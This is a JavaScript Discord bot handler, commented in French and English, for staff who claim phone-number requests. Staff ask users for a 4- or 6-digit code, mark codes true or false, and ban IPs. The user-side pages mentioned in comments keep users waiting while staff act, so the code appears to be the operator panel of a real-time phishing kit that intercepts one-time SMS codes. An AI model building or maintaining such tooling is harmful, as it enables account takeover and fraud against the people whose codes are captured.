/**
 * buttons.js — Discord button interaction handler  (v2.3)
 *
 * v2.3 — False code flow overhaul:
 *  OLD: falsecode → edit message "refused" → send NEW embed with True/False buttons
 *  NEW: falsecode → edit message IN-PLACE back to [4/6 digits · Wrong · Unclaim]
 *       so staff immediately picks the new code length without a second embed.
 *       User is redirected back to validation.html (waiting for new length) via
 *       verify-wait.js detecting retry_code status.
 *
 * v2.2: claimer-only buttons (in-memory + DB fallback after restart)
 * v2.1: len4/len6 length param, sendRetryEmbed defined, unclaim restores Claim button,
 *        double-claim protection, fetch timeout, unclaim logging.
 */

import {
    ButtonBuilder, ButtonStyle,
    ActionRowBuilder, EmbedBuilder,
} from "discord.js";
import { CONFIG }                            from "../config.js";
import { getRequestByPhone, getClaimedBy }  from "../database.js";
import { getOperatorColor }                  from "../utils/colors.js";
import { formatPhone }                       from "../utils/formatters.js";
import { buildNewRequestEmbed }             from "../utils/embedBuilder.js";
import { callStaffAction, callBanIP }       from "../utils/api.js";

// ─── In-memory claimer Map ────────────────────────────────────────────────────
export const claimedBy = new Map();

// ─── Shared button builders ───────────────────────────────────────────────────

function createBanIPButton(ip) {
    if (!ip || ip === "unknown" || ip === "null" || !ip.includes(".")) return null;
    return new ButtonBuilder()
        .setCustomId("banip_" + ip)
        .setLabel("🚫 Ban IP")
        .setStyle(ButtonStyle.Danger);
}

/** Returns the ActionRow used right after a claim (4/6 · Wrong · Unclaim · BanIP). */
function buildPostClaimRow(phone, ip) {
    const buttons = [
        new ButtonBuilder().setCustomId("len4_"    + phone).setLabel("🔢 4 chiffres").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId("len6_"    + phone).setLabel("🔢 6 chiffres").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId("wrong_"   + phone).setLabel("❌ Mauvais numéro").setStyle(ButtonStyle.Danger),
        new ButtonBuilder().setCustomId("unclaim_" + phone).setLabel("↩️ Unclaim").setStyle(ButtonStyle.Secondary),
    ];
    const banBtn = createBanIPButton(ip);
    if (banBtn) buttons.push(banBtn);
    return new ActionRowBuilder().addComponents(...buttons);
}

/** Edit a message silently (stale interaction tokens don't crash the bot). */
async function safeEditMessage(message, options) {
    try { await message.edit(options); }
    catch (e) { console.warn("⚠️  Could not edit message (stale?):", e.message); }
}

// ─── Claimer-only enforcement ─────────────────────────────────────────────────

/** Returns the claimer userId if the caller is NOT allowed, or null if allowed. */
async function getUnauthorizedClaimer(phone, userId) {
    let claimer = claimedBy.get(phone) ?? null;
    if (!claimer) {
        claimer = await getClaimedBy(phone);
        if (claimer) claimedBy.set(phone, claimer); // restore after restart
    }
    if (!claimer)              return null;  // no lock → allow
    if (claimer === userId)    return null;  // correct person → allow
    return claimer;                          // wrong person → deny
}

async function replyNotYourRequest(interaction, claimer) {
    await interaction.reply({
        content: `🔒 Cette demande a été claim par <@${claimer}>.\nSeul·e lui peut interagir avec ces boutons.`,
        flags: 64,
    });
}

// ─── Main handler ─────────────────────────────────────────────────────────────

export async function handleButton(interaction) {
    const [action, ...rest] = interaction.customId.split("_");
    const payload = rest.join("_");

    // ══ OPEN TO ALL STAFF ════════════════════════════════════════════════════

    // ─── CLAIM ────────────────────────────────────────────────────────────────
    if (action === "claim") {
        const phone = payload;
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAction("claim", phone, interaction.user.tag, null, interaction.user.id);
            if (!data.success) {
                await interaction.editReply({ content: "❌ " + (data.message || "Déjà claim par quelqu'un d'autre.") });
                return;
            }

            claimedBy.set(phone, interaction.user.id);
            await interaction.editReply({ content: `✅ Demande **${formatPhone(phone)}** claim par <@${interaction.user.id}>` });

            const row      = await getRequestByPhone(phone);
            const newEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(getOperatorColor(row?.operator))
                .setTitle("📋 Demande en cours")
                .setDescription(`👤 Claim par <@${interaction.user.id}>\n\n**🔧 Choisissez une action :**`);

            await safeEditMessage(interaction.message, {
                embeds:     [newEmbed],
                components: [buildPostClaimRow(phone, row?.ip_address)],
            });
        } catch (e) {
            console.error("Claim error:", e);
            await interaction.editReply({ content: "❌ Erreur réseau lors du claim." });
        }
        return;
    }

    // ─── BAN IP ───────────────────────────────────────────────────────────────
    if (action === "banip") {
        const ip = payload;
        await interaction.deferReply({ flags: 64 });
        if (!ip || ip === "unknown" || ip === "null") {
            await interaction.editReply({ content: "❌ IP invalide." });
            return;
        }
        try {
            const data = await callBanIP(ip, interaction.user.tag);
            if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }
            await interaction.editReply({ content: `🚫 IP **${ip}** bannie !` });
            const bannedEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(0xef4444).setTitle("🔨 IP Bannie")
                .setDescription(`🚫 **${ip}** bannie par <@${interaction.user.id}>`);
            await safeEditMessage(interaction.message, { embeds: [bannedEmbed], components: [] });
        } catch (e) {
            console.error("banip error:", e);
            await interaction.editReply({ content: "❌ Erreur réseau lors du ban." });
        }
        return;
    }

    // ══ CLAIMER-ONLY BUTTONS — check permission first ═════════════════════════
    const phone     = payload;
    const otherUser = await getUnauthorizedClaimer(phone, interaction.user.id);
    if (otherUser) { await replyNotYourRequest(interaction, otherUser); return; }

    // ─── 4 CHIFFRES ───────────────────────────────────────────────────────────
    if (action === "len4") {
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAction("set_length", phone, interaction.user.tag, 4);
            if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }
            await interaction.editReply({ content: `✅ Code **4 chiffres** demandé pour ${formatPhone(phone)}` });
            const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(0x10b981).setTitle("⏳ Attente du code (4 chiffres)")
                .setDescription("👤 Claim\n🔢 Code demandé : **4 chiffres**\n\n*En attente de saisie par l'utilisateur…*");
            await safeEditMessage(interaction.message, { embeds: [doneEmbed], components: [] });
        } catch (e) { console.error("len4 error:", e); await interaction.editReply({ content: "❌ Erreur." }); }
        return;
    }

    // ─── 6 CHIFFRES ───────────────────────────────────────────────────────────
    if (action === "len6") {
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAction("set_length", phone, interaction.user.tag, 6);
            if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }
            await interaction.editReply({ content: `✅ Code **6 chiffres** demandé pour ${formatPhone(phone)}` });
            const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(0x10b981).setTitle("⏳ Attente du code (6 chiffres)")
                .setDescription("👤 Claim\n🔢 Code demandé : **6 chiffres**\n\n*En attente de saisie par l'utilisateur…*");
            await safeEditMessage(interaction.message, { embeds: [doneEmbed], components: [] });
        } catch (e) { console.error("len6 error:", e); await interaction.editReply({ content: "❌ Erreur." }); }
        return;
    }

    // ─── MAUVAIS NUMÉRO ───────────────────────────────────────────────────────
    if (action === "wrong") {
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAction("wrong_number", phone, interaction.user.tag);
            if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }
            await interaction.editReply({ content: `✅ Mauvais numéro signalé pour ${formatPhone(phone)}` });
            claimedBy.delete(phone);
            const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(0xef4444).setTitle("❌ Mauvais numéro")
                .setDescription("❌ L'utilisateur est redirigé pour ressaisir son numéro.");
            await safeEditMessage(interaction.message, { embeds: [doneEmbed], components: [] });
        } catch (e) { console.error("wrong error:", e); await interaction.editReply({ content: "❌ Erreur." }); }
        return;
    }

    // ─── UNCLAIM ──────────────────────────────────────────────────────────────
    if (action === "unclaim") {
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAction("unclaim", phone, interaction.user.tag);
            if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }
            claimedBy.delete(phone);
            await interaction.editReply({ content: `↩️ Demande **${formatPhone(phone)}** unclaimée. Retour dans la file.` });

            const row    = await getRequestByPhone(phone);
            const reclaimBtn = new ButtonBuilder()
                .setCustomId("claim_" + phone).setLabel("📋 Claim").setStyle(ButtonStyle.Primary);
            const banBtn = createBanIPButton(row?.ip_address);
            const btns   = banBtn ? [reclaimBtn, banBtn] : [reclaimBtn];

            const unclaimedEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(0x6b7280).setTitle("📭 Demande unclaimée")
                .setDescription(`↩️ Unclaimée par <@${interaction.user.id}>\nRetour dans la file d'attente.`);
            await safeEditMessage(interaction.message, {
                embeds:     [unclaimedEmbed],
                components: [new ActionRowBuilder().addComponents(...btns)],
            });
        } catch (e) { console.error("unclaim error:", e); await interaction.editReply({ content: "❌ Erreur." }); }
        return;
    }

    // ─── TRUE CODE ────────────────────────────────────────────────────────────
    if (action === "truecode") {
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAction("true_code", phone, interaction.user.tag);
            if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }
            await interaction.editReply({ content: `✅ Code validé pour ${formatPhone(phone)} 🎉` });
            claimedBy.delete(phone);
            const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(0x10b981).setTitle("✅ Code validé !")
                .setDescription(`👤 Validé par <@${interaction.user.id}>\nL'utilisateur est redirigé vers la page de succès.`);
            await safeEditMessage(interaction.message, { embeds: [doneEmbed], components: [] });
        } catch (e) { console.error("truecode error:", e); await interaction.editReply({ content: "❌ Erreur." }); }
        return;
    }

    // ─── FALSE CODE ───────────────────────────────────────────────────────────
    // v2.3 FIX: instead of clearing the embed + sending a NEW retry embed,
    //           we edit the current message IN-PLACE back to the post-claim buttons
    //           (4/6 digits · Wrong · Unclaim · Ban IP).
    //
    // User side: verify-wait.js detects retry_code → redirects to validation.html?retry=1
    //            validation.js waits for waiting_code → redirects to code.html with correct length
    if (action === "falsecode") {
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAction("false_code", phone, interaction.user.tag);
            if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }

            await interaction.editReply({
                content: `🔄 Code refusé pour ${formatPhone(phone)}.\nChoisissez une nouvelle longueur — l'utilisateur va ressaisir son code.`,
            });

            const row = await getRequestByPhone(phone);

            // Edit this embed back to the "choose length" state so staff can pick 4 or 6 again
            const retryEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(0xf59e0b)
                .setTitle("🔄 Code refusé — Nouvelle longueur ?")
                .setDescription(
                    `👤 Claim par <@${interaction.user.id}>\n` +
                    `⚠️ Le code précédent était **incorrect**.\n` +
                    `L'utilisateur attend sur la page de validation.\n\n` +
                    `**Choisissez la longueur du prochain code :**`
                );

            await safeEditMessage(interaction.message, {
                embeds:     [retryEmbed],
                components: [buildPostClaimRow(phone, row?.ip_address)],
            });
        } catch (e) { console.error("falsecode error:", e); await interaction.editReply({ content: "❌ Erreur." }); }
        return;
    }

    console.warn("⚠️  Unknown button action:", action, "payload:", payload);
}
